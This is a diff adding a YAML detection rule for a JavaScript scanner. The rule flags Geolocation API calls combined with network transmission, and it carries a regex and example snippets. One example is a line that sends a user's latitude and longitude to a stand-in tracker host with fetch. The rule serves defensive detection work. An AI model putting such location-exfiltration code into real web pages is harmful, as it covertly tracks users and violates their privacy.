@@ -1,0 +1,39 @@
+# JavaScript Pattern: Unauthorized Geolocation Tracking
+# Detects geolocation API usage for tracking
+
+id: JS-014
+name: Unauthorized Geolocation Tracking
+description: |
+  Detects use of the Geolocation API combined with data transmission indicators.
+  While geolocation has legitimate uses in maps/location apps, attackers abuse it
+  to track users and exfiltrate location data. Pattern requires both geolocation
+  access AND evidence of data transmission (fetch, XMLHttpRequest, WebSocket).
+languages:
+  - javascript
+detection_type: regex
+# Require geolocation API combined with network transmission indicators
+detection_logic: 'navigator\.geolocation\.(?:getCurrentPosition|watchPosition).*(?:fetch|XMLHttpRequest|WebSocket|\.send|\.post)|(?:fetch|XMLHttpRequest|\.send).*navigator\.geolocation'
+severity: Low
+mitre_technique: T1614
+confidence: 0.7
+category: collection
+enabled: true
+paranoia_levels:
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1614/"
+    - "https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API"
+  tags:
+    - javascript
+    - geolocation
+    - tracking
+    - privacy
+  examples:
+    - "navigator.geolocation.getCurrentPosition(function(pos) { fetch('http://tracker.com/log?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude); });"
+    - "navigator.geolocation.watchPosition((position) => { sendLocation(position.coords); });"
+    - "if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(stealLocation); }"
